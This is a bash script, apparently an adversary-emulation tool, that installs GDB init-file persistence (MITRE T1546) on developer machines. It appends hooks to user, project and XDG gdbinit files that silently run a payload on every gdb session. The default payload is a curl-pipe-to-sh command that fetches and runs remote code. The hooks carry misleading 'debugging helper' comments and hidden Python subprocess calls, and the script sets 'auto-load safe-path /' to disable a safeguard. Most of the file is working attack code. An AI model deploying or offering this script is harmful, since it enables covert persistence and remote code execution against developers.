#!/bin/bash
# T1546 — Event Triggered Execution: GDB Init File Persistence
# Malicious .gdbinit executes on every gdb session — targets developers

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_gdbinit"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1546 — GDB Init File Persistence           ║"
    echo "  ║   Triggers on every gdb session (dev-target)  ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_gdbinit() {
    echo -e "${CYAN}[*] Deploying .gdbinit persistence${NC}"
    echo ""

    echo -e "${YELLOW}[*] GDB automatically sources:"
    echo -e "    1. ~/.gdbinit (user-level)"
    echo -e "    2. .gdbinit in CWD (if auto-load safe-path allows)"
    echo -e "    3. ~/.config/gdb/gdbinit (XDG path)"
    echo -e "    Can execute arbitrary commands via 'shell' or 'python'.${NC}"
    echo ""

    read -p "  Command/payload to execute: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/beacon | sh"

    echo -e "  ${CYAN}[a]${NC} User-level (~/.gdbinit)"
    echo -e "  ${CYAN}[b]${NC} Project-level (./.gdbinit in target directory)"
    echo -e "  ${CYAN}[c]${NC} XDG config (~/.config/gdb/gdbinit)"
    echo -e "  ${CYAN}[d]${NC} All locations"
    echo ""
    read -p "  Choose [a/b/c/d]: " MODE

    case "$MODE" in
        a) install_user_gdbinit "$CMD" ;;
        b) install_project_gdbinit "$CMD" ;;
        c) install_xdg_gdbinit "$CMD" ;;
        d) install_user_gdbinit "$CMD"; install_xdg_gdbinit "$CMD" ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

install_user_gdbinit() {
    local CMD="$1"
    local TARGET="$HOME/.gdbinit"

    # Backup existing
    [[ -f "$TARGET" ]] && cp "$TARGET" "${TARGET}.${MARKER}.bak"

    # Append malicious hooks that look legitimate
    cat >> "$TARGET" << GEOF

# ${MARKER} — Enhanced debugging helpers
define hook-run
  shell nohup sh -c '${CMD}' &>/dev/null &
end
define hook-start
  shell nohup sh -c '${CMD}' &>/dev/null &
end
# Python-based alternative (more stealthy)
python
import subprocess, os
try:
    subprocess.Popen(["sh", "-c", "${CMD}"],
        stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'),
        preexec_fn=os.setpgrp)
except:
    pass
end
GEOF

    echo -e "${GREEN}[+] Installed: ${TARGET}${NC}"
    echo -e "${YELLOW}[*] Triggers on: gdb <binary>, gdb attach, any gdb session${NC}"
}

install_project_gdbinit() {
    local CMD="$1"
    read -p "  Target directory (project root): " DIR
    [[ -z "$DIR" ]] && DIR="."
    [[ ! -d "$DIR" ]] && { echo -e "${RED}[!] Directory not found${NC}"; return; }

    local TARGET="${DIR}/.gdbinit"

    cat > "$TARGET" << GEOF
# Project-specific GDB configuration
# ${MARKER}
define hook-run
  shell nohup sh -c '${CMD}' &>/dev/null &
end
python
import subprocess, os
try:
    subprocess.Popen(["sh", "-c", "${CMD}"],
        stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'),
        preexec_fn=os.setpgrp)
except:
    pass
end
GEOF

    # Also need to allow auto-loading from this directory
    local USER_GDBINIT="$HOME/.gdbinit"
    if ! grep -q "safe-path" "$USER_GDBINIT" 2>/dev/null; then
        echo "set auto-load safe-path /" >> "$USER_GDBINIT"
    fi

    echo -e "${GREEN}[+] Installed: ${TARGET}${NC}"
    echo -e "${YELLOW}[*] Triggers when developer runs gdb in: ${DIR}${NC}"
}

install_xdg_gdbinit() {
    local CMD="$1"
    local DIR="$HOME/.config/gdb"
    mkdir -p "$DIR"

    cat >> "${DIR}/gdbinit" << GEOF

# ${MARKER} — Debug session logging
define hook-run
  shell nohup sh -c '${CMD}' &>/dev/null &
end
GEOF

    echo -e "${GREEN}[+] Installed: ${DIR}/gdbinit${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up .gdbinit persistence...${NC}"

    # User-level
    if [[ -f "$HOME/.gdbinit.${MARKER}.bak" ]]; then
        mv "$HOME/.gdbinit.${MARKER}.bak" "$HOME/.gdbinit"
    else
        sed -i "/${MARKER}/,/^end$/d" "$HOME/.gdbinit" 2>/dev/null
        sed -i '/^$/N;/^\n$/d' "$HOME/.gdbinit" 2>/dev/null
    fi

    # XDG
    sed -i "/${MARKER}/,/^end$/d" "$HOME/.config/gdb/gdbinit" 2>/dev/null

    echo -e "${GREEN}[+] .gdbinit persistence removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy .gdbinit persistence"
    echo -e "  ${CYAN}[2]${NC} Cleanup"
    echo ""
    read -p "Choose [1-2]: " OPT

    case "$OPT" in
        1) deploy_gdbinit ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
